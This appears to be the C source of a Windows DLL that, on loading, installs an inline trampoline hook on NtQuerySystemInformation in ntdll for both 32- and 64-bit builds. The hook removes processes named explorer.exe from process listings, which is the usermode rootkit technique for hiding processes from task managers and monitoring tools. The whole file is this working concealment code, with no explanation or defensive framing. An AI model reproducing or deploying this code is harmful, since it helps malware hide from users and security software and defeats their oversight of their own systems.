#include "main.h"

#if _WIN32 || _WIN64
	#if _WIN64
		#define ENVIRONMENT64
	#else
		#define ENVIRONMENT32
	#endif
#endif

typedef NTSTATUS(_stdcall *NtQuerySystemInformationOriginalDef)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, SIZE_T SystemInformationLength, PSIZE_T ReturnLength);
NtQuerySystemInformationOriginalDef NtQuerySystemInformationOriginal;

NTSTATUS _stdcall NtQuerySystemInformationHooked(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, SIZE_T SystemInformationLength, PSIZE_T ReturnLength)
{
	NTSTATUS Result;
	PSYSTEM_PROCESS_INFO pSystemProcess;
	PSYSTEM_PROCESS_INFO pNextSystemProcess;

	Result = NtQuerySystemInformationOriginal(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	if(NT_SUCCESS(Result) && SystemInformationClass == SystemProcessInformation)
	{
		pSystemProcess = (PSYSTEM_PROCESS_INFO)SystemInformation;
		pNextSystemProcess = (PSYSTEM_PROCESS_INFO)((PBYTE)pSystemProcess + pSystemProcess->NextEntryOffset);

		while (pNextSystemProcess->NextEntryOffset != 0)
		{
			if (lstrcmpW((&pNextSystemProcess->ImageName)->Buffer, L"explorer.exe") == 0) {
				pSystemProcess->NextEntryOffset += pNextSystemProcess->NextEntryOffset;
			}
			pSystemProcess = pNextSystemProcess;
			pNextSystemProcess = (PSYSTEM_PROCESS_INFO)((PBYTE)pSystemProcess + pSystemProcess->NextEntryOffset);
		}
	}

	return Result;
}

void InstallNtQuerySystemInformationHook_x86()
{
	BYTE TrampolineBytes[10] = { 0, 0, 0, 0, 0, 0xE9, 0, 0, 0, 0 };
	BYTE PatchBytes[5] = { 0xE9, 0, 0, 0, 0 };

	HANDLE hNtdll = GetModuleHandle(L"ntdll.dll");
	LPVOID realAddress = GetProcAddress(hNtdll, "NtQuerySystemInformation");
	LPVOID trampolineAddress = VirtualAlloc(NULL, 10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(TrampolineBytes, realAddress, 5);
	*(DWORD*)(TrampolineBytes + 6) = (DWORD)realAddress - (DWORD)trampolineAddress - 5;
	memcpy(trampolineAddress, TrampolineBytes, 10);

	NtQuerySystemInformationOriginal = trampolineAddress;

	*(DWORD*)&PatchBytes[1] = (DWORD)NtQuerySystemInformationHooked - (DWORD)realAddress - 5;
	BOOL writeSuccess = WriteProcessMemory(GetCurrentProcess(), realAddress, PatchBytes, sizeof(PatchBytes), NULL);
}

PVOID Allocate2GBRange(UINT_PTR address, SIZE_T dwSize)
{
	static ULONG dwAllocationGranularity;

	if (!dwAllocationGranularity)
	{
		SYSTEM_INFO si;
		GetSystemInfo(&si);
		dwAllocationGranularity = si.dwAllocationGranularity;
	}

	UINT_PTR min, max, addr, add = dwAllocationGranularity - 1, mask = ~add;

	min = address >= 0x80000000 ? (address - 0x80000000 + add) & mask : 0;
	max = address < (UINTPTR_MAX - 0x80000000) ? (address + 0x80000000) & mask : UINTPTR_MAX;

	MEMORY_BASIC_INFORMATION mbi;
	do
	{
		if (!VirtualQuery((void*)min, &mbi, sizeof(mbi))) return NULL;

		min = (UINT_PTR)mbi.BaseAddress + mbi.RegionSize;

		if (mbi.State == MEM_FREE)
		{
			addr = ((UINT_PTR)mbi.BaseAddress + add) & mask;

			if (addr < min && dwSize <= (min - addr))
			{
				if (addr = (UINT_PTR)VirtualAlloc((PVOID)addr, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
					return (PVOID)addr;
			}
		}


	} while (min < max);

	return NULL;
}

void InstallNtQuerySystemInformationHook_x64()
{
	BYTE QwordJumpTrampolineBytes[14] = { 0xFF, 0x25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	BYTE TrampolineBytes[13] = { 0, 0, 0, 0, 0, 0, 0, 0, 0xE9, 0, 0, 0, 0 };
	BYTE PatchBytes[5] = { 0xE9, 0, 0, 0, 0 };

	HANDLE hNtdll = GetModuleHandle(L"ntdll.dll");
	LPVOID realAddress = GetProcAddress(hNtdll, "NtQuerySystemInformation");
	printf("NtQuerySystemInformation address: 0x%p\n", realAddress);

	LPVOID trampolineAddress = Allocate2GBRange(realAddress, 27);
	printf("Allocation address: 0x%p", trampolineAddress);

	*(__int64*)&QwordJumpTrampolineBytes[6] = (__int64)NtQuerySystemInformationHooked;
	memcpy(trampolineAddress, QwordJumpTrampolineBytes, 14);
	
	memcpy(TrampolineBytes, realAddress, 5);
	*(DWORD*)(TrampolineBytes + 9) = (DWORD)realAddress - 15 - (DWORD)trampolineAddress - 5;
	memcpy((__int64)trampolineAddress + 15, TrampolineBytes, 13);

	NtQuerySystemInformationOriginal = (__int64)trampolineAddress + (__int64)15;

	*(DWORD*)&PatchBytes[1] = (DWORD)trampolineAddress - (DWORD)realAddress - 5;
	BOOL writeSuccess = WriteProcessMemory(GetCurrentProcess(), realAddress, PatchBytes, sizeof(PatchBytes), NULL);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		#if defined(ENVIRONMENT32)
			InstallNtQuerySystemInformationHook_x86();
		#endif
		#if defined(ENVIRONMENT64)
			InstallNtQuerySystemInformationHook_x64();
		#endif
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}